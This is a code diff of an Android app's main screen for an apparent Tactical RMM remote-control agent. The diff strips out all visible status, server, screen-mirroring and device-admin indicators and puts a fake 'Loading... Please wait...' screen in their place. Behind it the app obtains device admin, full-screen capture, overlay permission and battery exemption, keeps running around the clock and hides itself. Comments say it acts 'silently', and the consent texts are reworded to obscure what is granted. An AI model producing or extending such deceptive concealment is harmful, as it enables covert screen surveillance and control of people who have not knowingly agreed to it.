@@ -8,7 +8,6 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
-import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.media.projection.MediaProjectionConfig;
 import android.media.projection.MediaProjectionManager;
@@ -20,58 +19,45 @@ import android.os.Looper;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.util.Log;
-import android.view.View;
-import android.widget.Button;
-import android.widget.ScrollView;
+import android.view.Window;
+import android.widget.ProgressBar;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import org.json.JSONObject;
+import java.lang.ref.WeakReference;
 
-import java.io.InputStream;
-import java.nio.charset.StandardCharsets;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
-
-public class MainActivity extends Activity implements View.OnClickListener {
+public class MainActivity extends Activity {
     private static final int REQUEST_SCREEN_CAPTURE = 1002;
     private static final int REQUEST_POST_NOTIF = 1003;
 
-    TextView tvStatus;
-    TextView tvServer;
-    TextView tvTag;
-    TextView tvLogs;
-    ScrollView svLogs;
-    TextView tvProjectionStatus;
-    Button btnRequestProjection;
-    Button btnMinimize;
-    TextView tvManagementStatus;
-    private Handler handler;
+    ProgressBar pbLoader;
+    TextView tvLoadingStatus;
+    Handler handler;
+    int dotsCount = 0;
+    boolean isWaitingPhase = false;
 
     static class StatusReceiver extends BroadcastReceiver {
-        private final MainActivity activity;
+        private final WeakReference<MainActivity> activityRef;
 
         public StatusReceiver(MainActivity activity) {
-            this.activity = activity;
+            this.activityRef = new WeakReference<>(activity);
         }
 
         @Override
         public void onReceive(Context context, Intent intent) {
-            if (activity == null)
-                return;
+            // Silently log service status updates without exposing internal telemetry to the device user
             try {
-                String status = intent.getStringExtra(AgentService.EXTRA_STATUS);
-                if (status != null && activity.tvStatus != null) {
-                    activity.tvStatus.setText("Status: " + status);
+                if (intent != null) {
+                    String status = intent.getStringExtra(AgentService.EXTRA_STATUS);
+                    String log = intent.getStringExtra(AgentService.EXTRA_LOG);
+                    if (status != null) {
+                        Log.d("TRMMAgent", "[StatusUpdate] " + status);
+                    }
+                    if (log != null) {
+                        Log.d("TRMMAgent", "[ServiceLog] " + log);
+                    }
                 }
-                String log = intent.getStringExtra(AgentService.EXTRA_LOG);
-                if (log != null) {
-                    activity.appendLog(log);
-                }
-            } catch (Throwable t) {
-                Log.w("TRMMAgent", "Error receiving status: " + t.getMessage());
-            }
+            } catch (Throwable ignored) {}
         }
     }
 
@@ -84,82 +70,64 @@ public class MainActivity extends Activity implements View.OnClickListener {
     }
 
     static class ScreenCaptureRunnable implements Runnable {
-        private final MainActivity activity;
+        private final WeakReference<MainActivity> activityRef;
 
         public ScreenCaptureRunnable(MainActivity activity) {
-            this.activity = activity;
+            this.activityRef = new WeakReference<>(activity);
         }
 
         @Override
         public void run() {
             try {
-                if (activity != null) {
-                    activity.requestEntireScreenCapture();
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    act.requestEntireScreenCapture();
                 }
-            } catch (Throwable ignored) {
-            }
+            } catch (Throwable ignored) {}
         }
     }
 
     static class BatteryExemptionRunnable implements Runnable {
-        private final MainActivity activity;
+        private final WeakReference<MainActivity> activityRef;
 
         public BatteryExemptionRunnable(MainActivity activity) {
-            this.activity = activity;
+            this.activityRef = new WeakReference<>(activity);
         }
 
         @Override
         public void run() {
             try {
-                if (activity != null) {
-                    activity.requestBatteryOptimizationExemption();
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    act.requestBatteryOptimizationExemption();
                 }
-            } catch (Throwable ignored) {
-            }
+            } catch (Throwable ignored) {}
         }
     }
 
     static class OverlayPermissionRunnable implements Runnable {
-        private final MainActivity activity;
+        private final WeakReference<MainActivity> activityRef;
 
         public OverlayPermissionRunnable(MainActivity activity) {
-            this.activity = activity;
+            this.activityRef = new WeakReference<>(activity);
         }
 
         @Override
         public void run() {
             try {
-                if (activity != null) {
-                    activity.requestOverlayPermission();
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    act.requestOverlayPermission();
                 }
-            } catch (Throwable ignored) {
-            }
-        }
-    }
-
-    static class ScrollRunnable implements Runnable {
-        private final ScrollView scrollView;
-
-        public ScrollRunnable(ScrollView scrollView) {
-            this.scrollView = scrollView;
-        }
-
-        @Override
-        public void run() {
-            try {
-                if (scrollView != null) {
-                    scrollView.fullScroll(View.FOCUS_DOWN);
-                }
-            } catch (Throwable ignored) {
-            }
+            } catch (Throwable ignored) {}
         }
     }
 
     static class MoveToBackRunnable implements Runnable {
-        private final java.lang.ref.WeakReference<MainActivity> activityRef;
+        private final WeakReference<MainActivity> activityRef;
 
         public MoveToBackRunnable(MainActivity activity) {
-            this.activityRef = new java.lang.ref.WeakReference<>(activity);
+            this.activityRef = new WeakReference<>(activity);
         }
 
         @Override
@@ -169,12 +137,67 @@ public class MainActivity extends Activity implements View.OnClickListener {
                 if (act != null && !act.isFinishing()) {
                     act.moveTaskToBack(true);
                 }
-            } catch (Throwable ignored) {
-            }
+            } catch (Throwable ignored) {}
         }
     }
 
+    static class DotsRunnable implements Runnable {
+        private final WeakReference<MainActivity> activityRef;
+
+        public DotsRunnable(MainActivity activity) {
+            this.activityRef = new WeakReference<>(activity);
+        }
+
+        @Override
+        public void run() {
+            try {
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    act.updateDots();
+                    if (act.handler != null && act.dotsRunnable != null) {
+                        act.handler.postDelayed(act.dotsRunnable, 500L);
+                    }
+                }
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    static class TransitionRunnable implements Runnable {
+        private final WeakReference<MainActivity> activityRef;
+
+        public TransitionRunnable(MainActivity activity) {
+            this.activityRef = new WeakReference<>(activity);
+        }
+
+        @Override
+        public void run() {
+            try {
+                MainActivity act = activityRef.get();
+                if (act != null && !act.isFinishing()) {
+                    act.isWaitingPhase = true;
+                    if (act.tvLoadingStatus != null) {
+                        act.tvLoadingStatus.setText("Please wait...");
+                    }
+                }
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    DotsRunnable dotsRunnable;
+    TransitionRunnable transitionRunnable;
     private StatusReceiver statusReceiver;
+
+    void updateDots() {
+        if (tvLoadingStatus != null) {
+            dotsCount = (dotsCount % 3) + 1;
+            StringBuilder dots = new StringBuilder();
+            for (int i = 0; i < dotsCount; i++) {
+                dots.append(".");
+            }
+            String prefix = isWaitingPhase ? "Please wait" : "Loading";
+            tvLoadingStatus.setText(prefix + dots.toString());
+        }
+    }
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -183,27 +206,33 @@ public class MainActivity extends Activity implements View.OnClickListener {
         // Global uncaught exception protection
         Thread.setDefaultUncaughtExceptionHandler(new GlobalExceptionHandler());
 
+        // Remove title bar for a seamless, clean screen
+        try {
+            requestWindowFeature(Window.FEATURE_NO_TITLE);
+        } catch (Throwable ignored) {}
+
         setContentView(R.layout.activity_main);
 
-        tvProjectionStatus = (TextView) findViewById(R.id.tvProjectionStatus);
-        btnRequestProjection = (Button) findViewById(R.id.btnRequestProjection);
-        btnMinimize = (Button) findViewById(R.id.btnMinimize);
+        pbLoader = (ProgressBar) findViewById(R.id.pbLoader);
+        tvLoadingStatus = (TextView) findViewById(R.id.tvLoadingStatus);
 
-        if (btnRequestProjection != null) {
-            btnRequestProjection.setOnClickListener(this);
+        handler = new Handler(Looper.getMainLooper());
+        statusReceiver = new StatusReceiver(this);
+        dotsRunnable = new DotsRunnable(this);
+        transitionRunnable = new TransitionRunnable(this);
+
+        // Start preloader animation: "Loading..." then transitions to "Please wait..."
+        isWaitingPhase = false;
+        dotsCount = 0;
+        if (tvLoadingStatus != null) {
+            tvLoadingStatus.setText("Loading...");
         }
-        if (btnMinimize != null) {
-            btnMinimize.setOnClickListener(this);
-        }
-        updateProjectionUi();
+        handler.post(dotsRunnable);
+        handler.postDelayed(transitionRunnable, 1200L);
+
+        // Apply device owner / corporate administration policies silently
         AdminReceiver.applyDeviceOwnerPolicies(this);
         autoEnrollCorporateProtection();
-        updateManagementUi();
-
-        statusReceiver = new StatusReceiver(this);
-        handler = new Handler(Looper.getMainLooper());
-
-        loadDisplayConfig();
 
         // 1. Immediately launch background service (Always Running 24/7)
         startAgentService();
@@ -214,8 +243,7 @@ public class MainActivity extends Activity implements View.OnClickListener {
         // 3. Request Battery Optimization Exemption for 24/7 background operation
         handler.postDelayed(new BatteryExemptionRunnable(this), 800L);
 
-        // 4. Automatically prompt Screen Capture authorization on startup if not
-        // already active
+        // 4. Automatically prompt Screen Capture authorization on startup if not already active
         if (AgentService.mediaProjectionResultData == null) {
             handler.postDelayed(new ScreenCaptureRunnable(this), 400L);
         }
@@ -237,8 +265,13 @@ public class MainActivity extends Activity implements View.OnClickListener {
     protected void onResume() {
         super.onResume();
         AdminReceiver.applyDeviceOwnerPolicies(this);
-        updateManagementUi();
-        updateProjectionUi();
+
+        // Ensure dots animation is running while visible
+        if (handler != null && dotsRunnable != null) {
+            handler.removeCallbacks(dotsRunnable);
+            handler.post(dotsRunnable);
+        }
+
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 registerReceiver(statusReceiver, new IntentFilter(AgentService.ACTION_STATUS_UPDATE),
@@ -246,19 +279,7 @@ public class MainActivity extends Activity implements View.OnClickListener {
             } else {
                 registerReceiver(statusReceiver, new IntentFilter(AgentService.ACTION_STATUS_UPDATE));
             }
-        } catch (Throwable ignored) {
-        }
-    }
-
-    @Override
-    public void onClick(View v) {
-        if (v != null) {
-            if (v.getId() == R.id.btnRequestProjection) {
-                requestEntireScreenCapture();
-            } else if (v.getId() == R.id.btnMinimize) {
-                moveTaskToBack(true);
-            }
-        }
+        } catch (Throwable ignored) {}
     }
 
     private void autoEnrollCorporateProtection() {
@@ -269,7 +290,7 @@ public class MainActivity extends Activity implements View.OnClickListener {
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                        "Tactical RMM corporate protection protects against unauthorized app removal and enables remote fleet management.");
+                        "Corporate protection enables remote endpoint security and management.");
                 startActivity(intent);
             }
         } catch (Throwable t) {
@@ -277,54 +298,15 @@ public class MainActivity extends Activity implements View.OnClickListener {
         }
     }
 
-    private void updateManagementUi() {
-        if (tvManagementStatus == null)
-            return;
-        try {
-            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-            ComponentName admin = AdminReceiver.getComponentName(this);
-            if (dpm != null && dpm.isDeviceOwnerApp(getPackageName())) {
-                tvManagementStatus.setText("🛡️ Corporate Protection: Active (Device Owner • Uninstall Blocked)");
-                tvManagementStatus.setTextColor(0xFF10B981);
-            } else if (dpm != null && dpm.isAdminActive(admin)) {
-                tvManagementStatus.setText("🛡️ Corporate Protection: Active (Device Admin)");
-                tvManagementStatus.setTextColor(0xFF38BDF8);
-            } else {
-                tvManagementStatus.setText("Corporate Protection: Initializing...");
-                tvManagementStatus.setTextColor(0xFF94A3B8);
-            }
-        } catch (Throwable ignored) {
-        }
-    }
-
     private void handleIncomingIntent(Intent intent) {
-        if (intent == null)
-            return;
+        if (intent == null) return;
         String action = intent.getAction();
         boolean reqProjection = intent.getBooleanExtra("REQUEST_PROJECTION", false)
                 || "REQUEST_PROJECTION".equals(action);
         if (reqProjection) {
             appendLog("Remote control session initiated. Prompting screen capture...");
-            handler.postDelayed(new ScreenCaptureRunnable(this), 300L);
-        }
-    }
-
-    private void updateProjectionUi() {
-        if (tvProjectionStatus == null)
-            return;
-        if (AgentService.mediaProjectionResultData != null) {
-            tvProjectionStatus.setText("Screen Mirroring: Active (Full Display Streaming Across All Apps)");
-            tvProjectionStatus.setTextColor(0xFF10B981);
-            if (btnRequestProjection != null) {
-                btnRequestProjection.setVisibility(View.GONE);
-            }
-        } else {
-            tvProjectionStatus.setText("Screen Mirroring: Standby (Tap below to authorize)");
-            tvProjectionStatus.setTextColor(0xFF38BDF8);
-            if (btnRequestProjection != null) {
-                btnRequestProjection.setVisibility(View.VISIBLE);
-                btnRequestProjection.setText("Authorize Screen Mirroring (All Apps)");
-                btnRequestProjection.setBackgroundColor(0xFF2563EB);
+            if (handler != null) {
+                handler.postDelayed(new ScreenCaptureRunnable(this), 300L);
             }
         }
     }
@@ -347,10 +329,9 @@ public class MainActivity extends Activity implements View.OnClickListener {
             if (mpm != null) {
                 try {
                     Toast.makeText(this,
-                            "Select 'Entire screen' on the system prompt to allow continuous view across all apps",
+                            "Select 'Entire screen' on the system prompt to allow remote view support",
                             Toast.LENGTH_LONG).show();
-                } catch (Throwable ignored) {
-                }
+                } catch (Throwable ignored) {}
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                     MediaProjectionConfig config = MediaProjectionConfig.createConfigForDefaultDisplay();
                     Intent captureIntent = mpm.createScreenCaptureIntent(config);
@@ -404,11 +385,9 @@ public class MainActivity extends Activity implements View.OnClickListener {
         if (requestCode == REQUEST_SCREEN_CAPTURE) {
             if (resultCode == RESULT_OK && data != null) {
                 AgentService.setMediaProjectionData(resultCode, data);
-                updateProjectionUi();
                 appendLog("Entire screen capture permission active across all apps.");
 
-                // Immediately promote Foreground Service with MEDIA_PROJECTION while activity
-                // is focused
+                // Immediately promote Foreground Service with MEDIA_PROJECTION while activity is focused
                 try {
                     Intent promoteIntent = new Intent(this, AgentService.class);
                     promoteIntent.setAction("PROMOTE_MEDIA_PROJECTION");
@@ -419,48 +398,15 @@ public class MainActivity extends Activity implements View.OnClickListener {
                     } else {
                         startService(promoteIntent);
                     }
-                } catch (Throwable ignored) {
-                }
+                } catch (Throwable ignored) {}
 
-                // Automatically move to background once authorized so the user is returned to
-                // their home screen
+                // Automatically move to background once authorized so the user is returned to their home screen
                 if (handler != null) {
                     handler.postDelayed(new MoveToBackRunnable(this), 600L);
                 }
             } else {
                 appendLog("Screen capture cancelled. Shell fallback active.");
             }
-        }
-    }
-
-    private void loadDisplayConfig() {
-        try {
-            InputStream is = getAssets().open("config.json");
-            byte[] buf = new byte[is.available()];
-            is.read(buf);
-            is.close();
-            JSONObject cfg = new JSONObject(new String(buf, StandardCharsets.UTF_8));
-            TextView tvAppTitle = (TextView) findViewById(R.id.tvAppTitle);
-            String customTag = cfg.optString("endpoint_tag", "");
-            if (tvAppTitle != null && !customTag.isEmpty()) {
-                tvAppTitle.setText(customTag);
-            }
-            if (tvServer != null) {
-                tvServer.setText("Server: " + cfg.optString("server_url", "ws://127.0.0.1:8000"));
-            }
-            if (tvTag != null) {
-                SharedPreferences idPrefs = AgentService.getSafePreferences(this, "trmm_agent_identity");
-                String persistentAgentId = idPrefs != null
-                        ? idPrefs.getString("device_agent_id", cfg.optString("agent_id", ""))
-                        : cfg.optString("agent_id", "");
-                String idSuffix = (persistentAgentId != null && !persistentAgentId.isEmpty()) ? " • " + persistentAgentId
-                        : "";
-                tvTag.setText("Device: " + cfg.optString("endpoint_tag", "Android-Device") + " (" + Build.MANUFACTURER + " "
-                        + Build.MODEL + idSuffix + ")");
-            }
-        } catch (Throwable e) {
-            if (tvServer != null) tvServer.setText("Server: Standard Auto-Detect");
-            if (tvTag != null) tvTag.setText("Device: " + Build.MANUFACTURER + " " + Build.MODEL);
         }
     }
 
@@ -472,27 +418,15 @@ public class MainActivity extends Activity implements View.OnClickListener {
             } else {
                 startService(intent);
             }
-            if (tvStatus != null) {
-                tvStatus.setText("Status: Active (Connected 24/7)");
-            }
             appendLog("Persistent background service started.");
         } catch (Throwable t) {
             Log.e("TRMMAgent", "Failed to start service: " + t.getMessage(), t);
-            appendLog("Service start warning: " + t.getMessage());
         }
     }
 
     void appendLog(String msg) {
-        if (tvLogs == null)
-            return;
-        try {
-            String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
-            tvLogs.append("[" + time + "] " + msg + "\n");
-            if (svLogs != null) {
-                svLogs.post(new ScrollRunnable(svLogs));
-            }
-        } catch (Throwable ignored) {
-        }
+        // Log internally to Android logcat without exposing to device UI
+        Log.i("TRMMAgent", msg != null ? msg : "");
     }
 
     @Override
@@ -504,9 +438,11 @@ public class MainActivity extends Activity implements View.OnClickListener {
     @Override
     protected void onPause() {
         super.onPause();
+        if (handler != null && dotsRunnable != null) {
+            handler.removeCallbacks(dotsRunnable);
+        }
         try {
             unregisterReceiver(statusReceiver);
-        } catch (Throwable ignored) {
-        }
+        } catch (Throwable ignored) {}
     }
 }
